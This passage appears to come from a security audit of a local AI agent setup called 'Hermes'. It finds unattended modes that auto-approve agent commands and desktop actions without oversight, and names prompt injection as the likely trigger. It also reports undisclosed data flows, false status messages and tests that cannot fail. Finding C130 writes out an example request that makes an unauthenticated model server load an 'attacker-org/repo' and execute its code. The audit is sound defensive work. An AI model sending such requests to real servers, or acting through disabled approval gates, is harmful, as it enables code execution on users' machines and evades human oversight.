## What the findings have in common

1. **The unattended paths have no approval gate, and the docs say the
   opposite.**
   - **C36:** `hermes -z` sets `HERMES_YOLO_MODE=1`. Hermes also
     auto-approves every non-hardline command in any process that is
     neither the interactive CLI nor a gateway session, so `-z` never
     "fails closed". `-z` drives the chat fallback, the legacy briefing and
     the hourly intel agent pass, each with the full CLI toolset.
   - **C111:** `computer_use` asks for approval only when an approval
     callback is registered, and only the interactive CLI registers one.
     In the dashboard, Telegram and `-z`, the agent can type a command into
     Terminal.app and press Return, and no Hermes approval card appears.
   - Both are separate from B02 (the agent answering its own prompts over
     the API). None of the three needs a prompt injection, though an
     injection is the realistic trigger.
2. **The model servers are an unauthenticated code-loading surface (C130).**
   mlx_vlm loads whatever model id a request names, with
   `trust_remote_code=True`, no API key and CORS `*`. Any local client,
   container or web page that can reach `127.0.0.1:8080` while the model is
   up can make it run a Hugging Face repo's Python. B03's roster-side fix
   does not close this. Related: C49 (each start revalidates repos online
   and pulls upstream changes) and C131 (containers reach the dashboard as
   "loopback").
3. **"What leaves this Mac" has drifted from what does.**
   - C35: For-You sends the You-Model profile to Claude about hourly
     whenever escalation is on.
   - C48: the news switch does not stop feed fetching.
   - C50: the "dormant" agent web-research pass is live.
   - C51: the Google grant is full read/write Calendar while every surface
     says read-only.
   - C52: the NETWORK_FACTS table is incomplete.
   - Found while scoping the feature research: Hermes's core
     `text_to_speech` tool defaults to Microsoft Edge's cloud voices
     because `~/.hermes/config.yaml` has no `tts:` section. No call has
     ever been made.
4. **"Present", "Saved" and "ok" shown for states that are not.**
   - C18: Needs-you shows Messages as connected while Full Disk Access is
     denied.
   - C19: notes are silently cut at 8,000 characters under "Saved".
   - C21: Google shows Connected from the token file alone.
   - C22: clipboard output is truncated with `ok:true`.
   - C23: a failed resume silently starts a new agent session.
   - C27: a corrupt store reads as empty, and the empty default is then
     saved over it.
5. **The tests cannot fail for several load-bearing invariants.**
   - C74: an auto-approve-everything mutant of the approval gate passes
     every unit check.
   - C76: three same-origin guard rules can be deleted with every test
     green.
   - C77: the updater's checksum and lock handoff are removable the same
     way.
   - C83: silent skips are counted as PASS.
   - C81: the "offline" unit tier makes real internet calls.

**C35 — Unattended For-You loop sends the You-Model profile (goals, projects, people names) plus feed items to Claude whenever escalation is on, contradicting the 'that one question' disclosure**

**C130 — Model servers accept a request-supplied model id, load it with --trust-remote-code, require no auth and send CORS '*': code execution from any local client or web page, outside the dashboard**  
Location: `mlx-server.sh:165` · also `mlx-server.sh:195`, `mlx-server-bg.sh:76`, `mlx-server-bg.sh:84`, `mlx-vlm-launch.py:138`, `~/.hermes/mlx-vlm-venv/lib/python3.12/site-packages/mlx_vlm/server/openai.py:1697` · lens: local-surface · confirmed ×2 · relates to B03

- **What:** mlx-server.sh and mlx-server-bg.sh start mlx_vlm 0.6.14 with `--trust-remote-code` (which sets MLX_TRUST_REMOTE_CODE=true) and no `MLX_VLM_SERVER_API_KEY`. mlx_vlm's chat endpoint passes `request.model` straight to `get_cached_model()` and, when it differs from the cached model, calls `load(model_path, ..., trust_remote_code=True)`. The app also installs `CORSMiddleware(allow_origins=['*'], allow_credentials=True, allow_methods=['*'], allow_headers=['*'])`. So any client that can POST to 127.0.0.1:8080 or :8081 makes the server download an arbitrary Hugging Face repo and execute its `auto_map` Python as the owner. B03 describes this only as add -> download -> switch through the dashboard roster; that is not needed. CLAUDE.md even records the precondition ('both backends load whatever id the request names') without noting the consequence.
- **Failure:** Whenever the primary model is up (every chat, plus the 10-minute idle window; the bg lane on :8081 when started): a page at any loopback port (dev server), a container (host.docker.internal reaches host loopback, shown live), another local account, or any other local process sends `POST /v1/chat/completions {"model":"attacker-org/repo",...}`. Because of CORS '*' a browser page does not even need to be same-site (public sites are additionally subject to the browser's local-network permission).
